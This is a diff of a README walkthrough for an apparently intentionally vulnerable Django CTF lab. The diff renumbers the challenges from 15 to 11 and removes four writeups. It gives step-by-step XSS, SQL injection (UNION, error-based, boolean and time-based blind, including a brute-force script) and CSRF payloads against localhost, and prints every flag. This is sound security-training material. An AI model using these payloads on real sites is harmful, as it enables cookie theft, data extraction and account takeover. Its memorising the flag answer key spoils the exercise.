@@ -1,36 +1,32 @@
-# 🏴 Helmaand CTF — Complete Walkthrough & Solutions
+# Helmaand CTF -- Complete Walkthrough & Solutions
 
-> **Helmaand** is an intentionally vulnerable Django e-commerce platform designed for Capture The Flag (CTF) security training. It contains **15 challenges** across three categories: **Cross-Site Scripting (XSS)**, **SQL Injection (SQLi)**, and **Cross-Site Request Forgery (CSRF)**.
+> **Helmaand** is an intentionally vulnerable Django e-commerce platform designed for Capture The Flag (CTF) security training. It contains **11 challenges** across three categories: **Cross-Site Scripting (XSS)**, **SQL Injection (SQLi)**, and **Cross-Site Request Forgery (CSRF)**.
 
 ---
 
-## 📋 Table of Contents
+## Table of Contents
 
 - [Environment Setup](#-environment-setup)
 - [Challenge Categories](#-challenge-categories)
-- [XSS Challenges (1–5)](#-xss-challenges-15)
+- [XSS Challenges (1-3)](#-xss-challenges-13)
   - [Challenge 1: Stored XSS](#challenge-1--stored-xss)
   - [Challenge 2: Reflected XSS](#challenge-2--reflected-xss)
   - [Challenge 3: DOM-based XSS](#challenge-3--dom-based-xss)
-  - [Challenge 4: Attribute-based XSS](#challenge-4--attribute-based-xss)
-  - [Challenge 5: Self-XSS](#challenge-5--self-xss)
-- [SQL Injection Challenges (6–10)](#-sql-injection-challenges-610)
-  - [Challenge 6: UNION-based SQLi](#challenge-6--union-based-sqli)
-  - [Challenge 7: Error-based SQLi](#challenge-7--error-based-sqli)
-  - [Challenge 8: Blind Boolean SQLi](#challenge-8--blind-boolean-sqli)
-  - [Challenge 9: Time-based Blind SQLi](#challenge-9--time-based-blind-sqli)
-  - [Challenge 10: Authentication Bypass SQLi](#challenge-10--authentication-bypass-sqli)
-- [CSRF Challenges (11–15)](#-csrf-challenges-1115)
-  - [Challenge 11: CSRF via POST](#challenge-11--csrf-via-post-change-email)
-  - [Challenge 12: CSRF via GET](#challenge-12--csrf-via-get-reset-preferences)
-  - [Challenge 13: Login CSRF](#challenge-13--login-csrf)
-  - [Challenge 14: Logout CSRF](#challenge-14--logout-csrf)
-  - [Challenge 15: Password Change CSRF](#challenge-15--password-change-csrf)
-- [Quick Reference — All Flags](#-quick-reference--all-15-flags)
+- [SQL Injection Challenges (4-8)](#-sql-injection-challenges-48)
+  - [Challenge 4: UNION-based SQLi](#challenge-4--union-based-sqli)
+  - [Challenge 5: Error-based SQLi](#challenge-5--error-based-sqli)
+  - [Challenge 6: Blind Boolean SQLi](#challenge-6--blind-boolean-sqli)
+  - [Challenge 7: Time-based Blind SQLi](#challenge-7--time-based-blind-sqli)
+  - [Challenge 8: Authentication Bypass SQLi](#challenge-8--authentication-bypass-sqli)
+- [CSRF Challenges (9-11)](#-csrf-challenges-911)
+  - [Challenge 9: CSRF via POST](#challenge-9--csrf-via-post-change-email)
+  - [Challenge 10: CSRF via GET](#challenge-10--csrf-via-get-reset-preferences)
+  - [Challenge 11: Password Change CSRF](#challenge-11--password-change-csrf)
+- [Quick Reference -- All Flags](#-quick-reference--all-11-flags)
 
 ---
 
-## 🔧 Environment Setup
+## Environment Setup
 
 ### Prerequisites
 
@@ -77,21 +73,21 @@ The application will be available at **http://127.0.0.1:8000/**.
 
 ### Challenge Hub
 
-Visit **http://127.0.0.1:8000/lab/** to see the challenge dashboard listing all 15 challenges with their categories, difficulty levels, and descriptions.
+Visit **http://127.0.0.1:8000/lab/** to see the challenge dashboard listing all 11 challenges with their categories, difficulty levels, and descriptions.
 
 ---
 
-## 📊 Challenge Categories
+## Challenge Categories
 
 | # | Category | Challenges | Flag Delivery |
 |---|----------|------------|---------------|
-| 1 | Cross-Site Scripting (XSS) | 1–5 | Browser cookies (`ctf_xss_*`) |
-| 2 | SQL Injection (SQLi) | 6–10 | Hidden DB records, error leaks, flash messages |
-| 3 | Cross-Site Request Forgery (CSRF) | 11–15 | Django flash messages |
+| 1 | Cross-Site Scripting (XSS) | 1-3 | Browser cookies (`ctf_xss_*`) |
+| 2 | SQL Injection (SQLi) | 4-8 | Hidden DB records, error leaks, flash messages |
+| 3 | Cross-Site Request Forgery (CSRF) | 9-11 | Django flash messages |
 
 ---
 
-## 🎯 XSS Challenges (1–5)
+## XSS Challenges (1-3)
 
 XSS challenges set a browser cookie containing the flag when you visit the vulnerable page. The goal is to execute JavaScript on the page and read `document.cookie` to retrieve it.
 
@@ -103,8 +99,8 @@ XSS challenges set a browser cookie containing the flag when you visit the vulne
 |-------|-------|
 | **Difficulty** | Easy |
 | **Category** | XSS |
-| **Vulnerability** | Stored XSS — review comment rendered with `\|safe` filter |
-| **Vulnerable Code** | `shop/views.py` (sets cookie), `templates/shop/detail.html` (`{{ review.comment\|safe }}`) |
+| **Vulnerability** | Stored XSS -- review comment rendered with `|safe` filter |
+| **Vulnerable Code** | `shop/views.py` (sets cookie), `templates/shop/detail.html` (`{{ review.comment|safe }}`) |
 | **Flag Location** | Cookie `ctf_xss_stored` |
 | **Flag** | `HLMD{st0r3d_c00k13_m0nst3r}` |
 
@@ -117,7 +113,7 @@ XSS challenges set a browser cookie containing the flag when you visit the vulne
    <img src=x onerror="alert(document.cookie)">
    ```
 4. Submit the review.
-5. Reload the product page — the malicious JavaScript executes automatically.
+5. Reload the product page -- the malicious JavaScript executes automatically.
 6. An alert box appears showing `document.cookie`, which contains:
    ```
    ctf_xss_stored=HLMD{st0r3d_c00k13_m0nst3r}
@@ -137,8 +133,8 @@ The `detail.html` template renders review comments using the `|safe` filter, whi
 |-------|-------|
 | **Difficulty** | Easy |
 | **Category** | XSS |
-| **Vulnerability** | Reflected XSS — `?id=` query parameter rendered with `\|safe` |
-| **Vulnerable Code** | `shop/views.py` (sets cookie), `templates/shop/track_order.html` (`{{ tracking_id\|safe }}`) |
+| **Vulnerability** | Reflected XSS -- `?id=` query parameter rendered with `|safe` |
+| **Vulnerable Code** | `shop/views.py` (sets cookie), `templates/shop/track_order.html` (`{{ tracking_id|safe }}`) |
 | **Flag Location** | Cookie `ctf_xss_reflected` |
 | **Flag** | `HLMD{r3fl3ct3d_gl4ss_sh4tt3r}` |
 
@@ -167,8 +163,8 @@ The `track_order.html` template takes the `tracking_id` value from the URL query
 |-------|-------|
 | **Difficulty** | Intermediate |
 | **Category** | XSS |
-| **Vulnerability** | DOM-based XSS — `location.hash` written to `innerHTML` via client-side JavaScript |
-| **Vulnerable Code** | `templates/shop/gallery.html` (JS reads `location.hash` → `el.innerHTML = hash;`) |
+| **Vulnerability** | DOM-based XSS -- `location.hash` written to `innerHTML` via client-side JavaScript |
+| **Vulnerable Code** | `templates/shop/gallery.html` (JS reads `location.hash` -> `el.innerHTML = hash;`) |
 | **Flag Location** | Cookie `ctf_xss_dom` |
 | **Flag** | `HLMD{d0m_s1nk_b0w_bre4ch}` |
 
@@ -187,86 +183,19 @@ The `track_order.html` template takes the `tracking_id` value from the URL query
 
 #### Why It Works
 
-Unlike stored or reflected XSS, DOM-based XSS occurs entirely on the **client side**. The server never sees the payload — it's in the URL fragment (`#`), which is not sent to the server. The page's JavaScript reads `location.hash` and writes it to `innerHTML` without sanitization.
+Unlike stored or reflected XSS, DOM-based XSS occurs entirely on the **client side**. The server never sees the payload -- it's in the URL fragment (`#`), which is not sent to the server. The page's JavaScript reads `location.hash` and writes it to `innerHTML` without sanitization.
 
 > **Note:** The fragment (`#...`) is not sent to the server in HTTP requests, so server-side WAFs or frameworks cannot detect this attack. The cookie is set by the view on page load.
 
 ---
 
-### Challenge 4: Attribute-based XSS
-
-| Field | Value |
-|-------|-------|
-| **Difficulty** | Intermediate |
-| **Category** | XSS |
-| **Vulnerability** | Attribute breakout — `?name=` reflected into `value="..."` attribute with `\|safe` |
-| **Vulnerable Code** | `shop/views.py` (sets cookie), `templates/shop/newsletter.html` (`value="{{ name\|safe }}"`) |
-| **Flag Location** | Cookie `ctf_xss_attribute` |
-| **Flag** | `HLMD{4ttr_m0us3_0v3r_l34k}` |
-
-#### Step-by-Step Solution
-
-1. Visit the newsletter signup page with a payload that breaks out of the HTML attribute:
-   ```
-   http://127.0.0.1:8000/newsletter/?name=" onmouseover="alert(document.cookie)
-   ```
-2. The template renders this into an input field:
-   ```html
-   <input type="text" name="name" value="" onmouseover="alert(document.cookie)">
-   ```
-3. The `"` closes the `value` attribute, and `onmouseover` becomes a new event handler on the input element.
-4. **Hover your mouse over the input field** to trigger the event.
-5. An alert shows `document.cookie`, containing:
-   ```
-   ctf_xss_attribute=HLMD{4ttr_m0us3_0v3r_l34k}
-   ```
-
-#### Why It Works
-
-The `|safe` filter disables auto-escaping for the `name` value. When the value is placed inside a `value="..."` attribute, an attacker can inject a `"` character to close the attribute early and inject a new event-handler attribute (`onmouseover`).
-
----
-
-### Challenge 5: Self-XSS
-
-| Field | Value |
-|-------|-------|
-| **Difficulty** | Easy |
-| **Category** | XSS |
-| **Vulnerability** | Self-XSS — username rendered with `\|safe` on own profile page |
-| **Vulnerable Code** | `accounts/views.py` (sets cookie), `templates/accounts/profile.html` (`{{ user.username\|safe }}`), `accounts/forms.py` (`UserRegisterForm` with no username sanitization) |
-| **Flag Location** | Cookie `ctf_xss_self` |
-| **Flag** | `HLMD{s3lf_1nfl1ct3d_1nj3ct}` |
-
-#### Step-by-Step Solution
-
-1. Go to the **registration page** at **http://127.0.0.1:8000/accounts/register/**.
-2. Register a new account using an XSS payload as the **username**:
-   ```
-   Username: <img src=x onerror="alert(document.cookie)">
-   Password: anypassword123
-   ```
-3. Log in with the newly created account.
-4. Navigate to your profile page at **http://127.0.0.1:8000/accounts/profile/**.
-5. The username renders unescaped, triggering the JavaScript.
-6. The alert shows `document.cookie`, containing:
-   ```
-   ctf_xss_self=HLMD{s3lf_1nfl1ct3d_1nj3ct}
-   ```
-
-#### Why It Works
-
-The `UserRegisterForm` does not sanitize or restrict the username field. The profile page renders `{{ user.username|safe }}`, allowing HTML/JS in the username to execute. Since only the user sees their own profile, this is "self-XSS" — the attacker tricks themselves (or social-engineers a victim) into executing it.
-
----
-
-## 💉 SQL Injection Challenges (6–10)
+## SQL Injection Challenges (4-8)
 
 SQL Injection challenges exploit raw SQL queries built with f-string interpolation. Flags are stored in the database and extracted through various SQLi techniques.
 
 ---
 
-### Challenge 6: UNION-based SQLi
+### Challenge 4: UNION-based SQLi
 
 | Field | Value |
 |-------|-------|
@@ -286,7 +215,7 @@ SQL Injection challenges exploit raw SQL queries built with f-string interpolati
 2. There is a hidden product (slug `ctf-secret-flag-product`, `is_active=0`) whose description contains the flag. The `is_active = 1` filter hides it from normal searches.
 3. Craft a UNION-based payload to extract the hidden product:
    ```
-   http://127.0.0.1:8000/search/?q=x' UNION SELECT id,name,slug,brand,description,price,discount_price,stock,size,color,is_active,created_at,updated_at,category_id FROM shop_product WHERE is_active=0 -- 
+   http://127.0.0.1:8000/search/?q=x' UNION SELECT id,name,slug,brand,description,price,discount_price,stock,size,color,is_active,created_at,updated_at,category_id FROM shop_product WHERE is_active=0 --
    ```
 4. The page now shows the hidden "Secret Admin Item" product in the search results.
 5. Its description reads:
@@ -306,7 +235,7 @@ The search query uses an f-string to build raw SQL (`f"...LIKE '%{q}%'..."`), al
 
 ---
 
-### Challenge 7: Error-based SQLi
+### Challenge 5: Error-based SQLi
 
 | Field | Value |
 |-------|-------|
@@ -321,13 +250,13 @@ The search query uses an f-string to build raw SQL (`f"...LIKE '%{q}%'..."`), al
 
 1. The category filter page at **http://127.0.0.1:8000/filter/** accepts a `sort` parameter that is concatenated into an `ORDER BY` clause.
 2. Normal sort values are `name`, `price`, or `created_at` (whitelisted). Any other value triggers a raw SQL path.
-3. **Step 1 — Trigger an error to leak schema info:**
+3. **Step 1 -- Trigger an error to leak schema info:**
    ```
    http://127.0.0.1:8000/filter/?sort=invalidcolumn
    ```
    The page displays the raw SQLite error message, leaking table and column names.
 
-4. **Step 2 — Extract the flag using an error-based subquery:**
+4. **Step 2 -- Extract the flag using an error-based subquery:**
    ```
    http://127.0.0.1:8000/filter/?sort=(CASE WHEN (SELECT substr(flag,1,1) FROM security_ctfflag WHERE challenge_id='sqli_error')='H' THEN name ELSE price END)
    ```
@@ -344,7 +273,7 @@ The `sort` parameter is directly concatenated into `ORDER BY {sort}`. Invalid SQ
 
 ---
 
-### Challenge 8: Blind Boolean SQLi
+### Challenge 6: Blind Boolean SQLi
 
 | Field | Value |
 |-------|-------|
@@ -361,13 +290,13 @@ The `sort` parameter is directly concatenated into `ORDER BY {sort}`. Invalid SQ
    ```sql
    SELECT * FROM shop_product WHERE id = {id}
    ```
-2. The response only reveals whether a product was found ("In Stock") or not ("Product not found"/"Out of Stock") — no direct data output.
+2. The response only reveals whether a product was found ("In Stock") or not ("Product not found"/"Out of Stock") -- no direct data output.
 3. Use a **boolean-based blind** technique to extract the flag character by character:
    ```
-   http://127.0.0.1:8000/stock/?id=1 AND (SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_blind') -- 
+   http://127.0.0.1:8000/stock/?id=1 AND (SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_blind') --
    ```
-   - If the response says "In Stock" → the condition is **true** (first char is `H`).
-   - If "Product not found" → the condition is **false**.
+   - If the response says "In Stock" -> the condition is **true** (first char is `H`).
+   - If "Product not found" -> the condition is **false**.
 
 4. Iterate through each position (1, 2, 3, ...) and each character (A-Z, a-z, 0-9, `{`, `}`, `_`) to reconstruct the full flag.
 5. The complete flag is:
@@ -390,7 +319,7 @@ for pos in range(1, 50):
         r = requests.get(f"{BASE}/stock/", params={"id": payload})
         if "In Stock" in r.text:
             flag += c
-            print(f"[+] Position {pos}: {c}  →  {flag}")
+            print(f"[+] Position {pos}: {c}  ->  {flag}")
             break
     else:
         break
@@ -404,7 +333,7 @@ Since the application only returns a boolean indicator (product exists / doesn't
 
 ---
 
-### Challenge 9: Time-based Blind SQLi
+### Challenge 7: Time-based Blind SQLi
 
 | Field | Value |
 |-------|-------|
@@ -422,21 +351,21 @@ Since the application only returns a boolean indicator (product exists / doesn't
    SELECT * FROM shop_promocode WHERE code = '{code}'
    ```
 2. Valid promo codes (seeded): `SUMMER25`, `WELCOME10`, `VIP50`.
-3. The response returns "Valid" or "Invalid" — boolean-based extraction is possible, but time-based is also effective.
+3. The response returns "Valid" or "Invalid" -- boolean-based extraction is possible, but time-based is also effective.
 
 4. **Boolean path (SQLite):**
    ```
-   http://127.0.0.1:8000/promo/?code=SUMMER25' OR (SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_time') -- 
+   http://127.0.0.1:8000/promo/?code=SUMMER25' OR (SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_time') --
    ```
-   - "Valid" → condition is **true**.
-   - "Invalid" → condition is **false**.
+   - "Valid" -> condition is **true**.
+   - "Invalid" -> condition is **false**.
 
 5. **Time-based path (MySQL, for educational purposes):**
    ```
-   http://127.0.0.1:8000/promo/?code=SUMMER25' OR IF((SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_time'),SLEEP(3),0) -- 
+   http://127.0.0.1:8000/promo/?code=SUMMER25' OR IF((SELECT substr(flag,1,1)='H' FROM security_ctfflag WHERE challenge_id='sqli_time'),SLEEP(3),0) --
    ```
-   - If the response takes ~3 seconds → condition is **true**.
-   - If the response is immediate → condition is **false**.
+   - If the response takes ~3 seconds -> condition is **true**.
+   - If the response is immediate -> condition is **false**.
 
 6. Iterate through each character to reconstruct the flag:
    ```
@@ -445,11 +374,11 @@ Since the application only returns a boolean indicator (product exists / doesn't
 
 #### Why It Works
 
-The promo code is interpolated directly into raw SQL. Boolean-based extraction works because "Valid"/"Invalid" reveals the truth value of injected conditions. Time-based extraction works by injecting a conditional `SLEEP()` — if the condition is true, the database pauses, making the response slow. This is useful when no boolean indicator is available.
+The promo code is interpolated directly into raw SQL. Boolean-based extraction works because "Valid"/"Invalid" reveals the truth value of injected conditions. Time-based extraction works by injecting a conditional `SLEEP()` -- if the condition is true, the database pauses, making the response slow. This is useful when no boolean indicator is available.
 
 ---
 
-### Challenge 10: Authentication Bypass SQLi
+### Challenge 8: Authentication Bypass SQLi
 
 | Field | Value |
 |-------|-------|
@@ -499,7 +428,7 @@ The staff login form builds a raw SQL query using f-string interpolation with us
 
 ---
 
-## 🔐 CSRF Challenges (11–15)
+## CSRF Challenges (9-11)
 
 CSRF challenges exploit missing CSRF token validation on state-changing operations. Flags are delivered via Django flash messages after the forged request succeeds.
 
@@ -507,7 +436,7 @@ CSRF challenges exploit missing CSRF token validation on state-changing operatio
 
 ---
 
-### Challenge 11: CSRF via POST (Change Email)
+### Challenge 9: CSRF via POST (Change Email)
 
 | Field | Value |
 |-------|-------|
@@ -545,7 +474,7 @@ The `change_email` view is marked `@csrf_exempt`, meaning Django does not valida
 
 ---
 
-### Challenge 12: CSRF via GET (Reset Preferences)
+### Challenge 10: CSRF via GET (Reset Preferences)
 
 | Field | Value |
 |-------|-------|
@@ -572,80 +501,11 @@ The `change_email` view is marked `@csrf_exempt`, meaning Django does not valida
 
 #### Why It Works
 
-The `reset_preferences` view performs a **state-changing operation (deleting data) via a GET request**, which violates REST principles and CSRF best practices. Browsers send GET requests automatically when loading images, so a simple `<img>` tag on any page can trigger the deletion — no JavaScript or form submission required.
+The `reset_preferences` view performs a **state-changing operation (deleting data) via a GET request**, which violates REST principles and CSRF best practices. Browsers send GET requests automatically when loading images, so a simple `<img>` tag on any page can trigger the deletion -- no JavaScript or form submission required.
 
 ---
 
-### Challenge 13: Login CSRF
-
-| Field | Value |
-|-------|-------|
-| **Difficulty** | Intermediate |
-| **Category** | CSRF |
-| **Vulnerability** | `@csrf_exempt` login endpoint — attacker logs victim into attacker's account |
-| **Vulnerable Code** | `accounts/views.py` (`@csrf_exempt` on `quick_login` view) |
-| **Flag Location** | Flash message after redirect (`messages.success`) |
-| **Flag** | `HLMD{l0g1n_sw4p_1mp3rs0n4t10n}` |
-
-#### Step-by-Step Solution
-
-1. The attacker first registers an account on Helmaand (e.g., username `attacker`, password `attackerpass`).
-2. The attacker hosts the following malicious HTML page:
-   ```html
-   <html>
-   <body onload="document.forms[0].submit()">
-     <form action="http://127.0.0.1:8000/accounts/quick-login/" method="POST">
-       <input type="hidden" name="username" value="attacker">
-       <input type="hidden" name="password" value="attackerpass">
-     </form>
-   </body>
-   </html>
-   ```
-3. The victim (who may or may not be logged in) visits the attacker's page.
-4. The form auto-submits, logging the victim into the **attacker's account**.
-5. The victim is redirected to the profile page showing the flash message:
-   ```
-   Flag: HLMD{l0g1n_sw4p_1mp3rs0n4t10n}
-   ```
-
-#### Why It Works
-
-The `quick_login` view is `@csrf_exempt`, allowing any website to submit login credentials on behalf of the user. This is a **Login CSRF** — the attacker doesn't steal the victim's credentials, but instead logs the victim into the attacker's account. This can be used to trick the victim into entering sensitive data that the attacker can later read by logging into their own account.
-
----
-
-### Challenge 14: Logout CSRF
-
-| Field | Value |
-|-------|-------|
-| **Difficulty** | Easy |
-| **Category** | CSRF |
-| **Vulnerability** | Logout via plain GET request with no CSRF protection |
-| **Vulnerable Code** | `accounts/views.py` (`force_logout` view, GET handler) |
-| **Flag Location** | Flash message on login page after redirect |
-| **Flag** | `HLMD{l0g0ut_f0rc3d_3v1ct10n}` |
-
-#### Step-by-Step Solution
-
-1. The victim must be logged in to Helmaand.
-2. The attacker embeds the following on any external page:
-   ```html
-   <img src="http://127.0.0.1:8000/accounts/force-logout/" style="display:none">
-   ```
-3. When the victim loads the attacker's page, their browser sends a GET request to `/accounts/force-logout/`.
-4. The victim is logged out of Helmaand.
-5. They are redirected to the login page, which shows the flash message:
-   ```
-   Flag: HLMD{l0g0ut_f0rc3d_3v1ct10n}
-   ```
-
-#### Why It Works
-
-The `force_logout` view logs the user out via a GET request with no CSRF token validation. Since browsers auto-request images via GET, a hidden `<img>` tag is sufficient to force-logout any logged-in victim. This is a denial-of-service attack on the user's session.
-
----
-
-### Challenge 15: Password Change CSRF
+### Challenge 11: Password Change CSRF
 
 | Field | Value |
 |-------|-------|
@@ -679,42 +539,38 @@ The `force_logout` view logs the user out via a GET request with no CSRF token v
 
 #### Why It Works
 
-The `change_password` view is `@csrf_exempt` and accepts a `new_password` POST parameter. Any website can submit a form that silently changes the victim's password. The use of `update_session_auth_hash()` ensures the victim's session isn't invalidated, making the attack invisible — the victim won't notice until the attacker logs in with the new password.
+The `change_password` view is `@csrf_exempt` and accepts a `new_password` POST parameter. Any website can submit a form that silently changes the victim's password. The use of `update_session_auth_hash()` ensures the victim's session isn't invalidated, making the attack invisible -- the victim won't notice until the attacker logs in with the new password.
 
 ---
 
-## 🏁 Quick Reference — All 15 Flags
+## Quick Reference -- All 11 Flags
 
 | # | Challenge | Category | Difficulty | Flag |
 |---|-----------|----------|------------|------|
 | 1 | Stored XSS | XSS | Easy | `HLMD{st0r3d_c00k13_m0nst3r}` |
 | 2 | Reflected XSS | XSS | Easy | `HLMD{r3fl3ct3d_gl4ss_sh4tt3r}` |
 | 3 | DOM-based XSS | XSS | Intermediate | `HLMD{d0m_s1nk_b0w_bre4ch}` |
-| 4 | Attribute XSS | XSS | Intermediate | `HLMD{4ttr_m0us3_0v3r_l34k}` |
-| 5 | Self-XSS | XSS | Easy | `HLMD{s3lf_1nfl1ct3d_1nj3ct}` |
-| 6 | UNION SQLi | SQLi | Intermediate | `HLMD{un10n_s3l3ct_d4t4_dr41n}` |
-| 7 | Error-based SQLi | SQLi | Intermediate | `HLMD{3rr0r_l34k_sch3m4_expl0s10n}` |
-| 8 | Blind Boolean SQLi | SQLi | Intermediate | `HLMD{bl1nd_b00l3an_0r4cl3}` |
-| 9 | Time-based SQLi | SQLi | Intermediate | `HLMD{t1m3_w41ts_f0r_n0_0n3}` |
-| 10 | Auth Bypass SQLi | SQLi | Easy | `HLMD{4uth_byp4ss_m4st3r_k3y}` |
-| 11 | CSRF via POST | CSRF | Intermediate | `HLMD{f0rg3d_p0st_3m41l_h1j4ck}` |
-| 12 | CSRF via GET | CSRF | Easy | `HLMD{g3t_r3qu3st_s1l3nt_w1p3}` |
-| 13 | Login CSRF | CSRF | Intermediate | `HLMD{l0g1n_sw4p_1mp3rs0n4t10n}` |
-| 14 | Logout CSRF | CSRF | Easy | `HLMD{l0g0ut_f0rc3d_3v1ct10n}` |
-| 15 | Password Change CSRF | CSRF | Intermediate | `HLMD{p4ssw0rd_r3s3t_p0wn3d}` |
+| 4 | UNION SQLi | SQLi | Intermediate | `HLMD{un10n_s3l3ct_d4t4_dr41n}` |
+| 5 | Error-based SQLi | SQLi | Intermediate | `HLMD{3rr0r_l34k_sch3m4_expl0s10n}` |
+| 6 | Blind Boolean SQLi | SQLi | Intermediate | `HLMD{bl1nd_b00l3an_0r4cl3}` |
+| 7 | Time-based SQLi | SQLi | Intermediate | `HLMD{t1m3_w41ts_f0r_n0_0n3}` |
+| 8 | Auth Bypass SQLi | SQLi | Easy | `HLMD{4uth_byp4ss_m4st3r_k3y}` |
+| 9 | CSRF via POST | CSRF | Intermediate | `HLMD{f0rg3d_p0st_3m41l_h1j4ck}` |
+| 10 | CSRF via GET | CSRF | Easy | `HLMD{g3t_r3qu3st_s1l3nt_w1p3}` |
+| 11 | Password Change CSRF | CSRF | Intermediate | `HLMD{p4ssw0rd_r3s3t_p0wn3d}` |
 
 ---
 
-## 📚 Flag Delivery Mechanism Summary
+## Flag Delivery Mechanism Summary
 
 | Category | Flag Delivery Method |
 |----------|---------------------|
-| **XSS (1–5)** | Each vulnerable view sets a browser cookie (`ctf_xss_stored`, `ctf_xss_reflected`, `ctf_xss_dom`, `ctf_xss_attribute`, `ctf_xss_self`). The flag must be exfiltrated via `document.cookie` through the XSS payload. |
-| **SQLi (6)** | Flag stored in the `description` field of a hidden `shop_product` row (`is_active=0`). Extracted via UNION SELECT. |
-| **SQLi (7–9)** | Flag stored in the `security_ctfflag` database table, keyed by `challenge_id` (`sqli_error`, `sqli_blind`, `sqli_time`). Extracted via error-based, blind boolean, or time-based techniques. |
-| **SQLi (10)** | Flag displayed as a Django flash message (`messages.info`) after successful authentication bypass. |
-| **CSRF (11–15)** | Flag displayed as a Django flash message (`messages.info` / `messages.success`) after the forged request succeeds. |
+| **XSS (1-3)** | Each vulnerable view sets a browser cookie (`ctf_xss_stored`, `ctf_xss_reflected`, `ctf_xss_dom`). The flag must be exfiltrated via `document.cookie` through the XSS payload. |
+| **SQLi (4)** | Flag stored in the `description` field of a hidden `shop_product` row (`is_active=0`). Extracted via UNION SELECT. |
+| **SQLi (5-7)** | Flag stored in the `security_ctfflag` database table, keyed by `challenge_id` (`sqli_error`, `sqli_blind`, `sqli_time`). Extracted via error-based, blind boolean, or time-based techniques. |
+| **SQLi (8)** | Flag displayed as a Django flash message (`messages.info`) after successful authentication bypass. |
+| **CSRF (9-11)** | Flag displayed as a Django flash message (`messages.info` / `messages.success`) after the forged request succeeds. |
 
 ---
 
-*Helmaand CTF — Built for security learning and practice.*
+*Helmaand CTF -- Built for security learning and practice.*
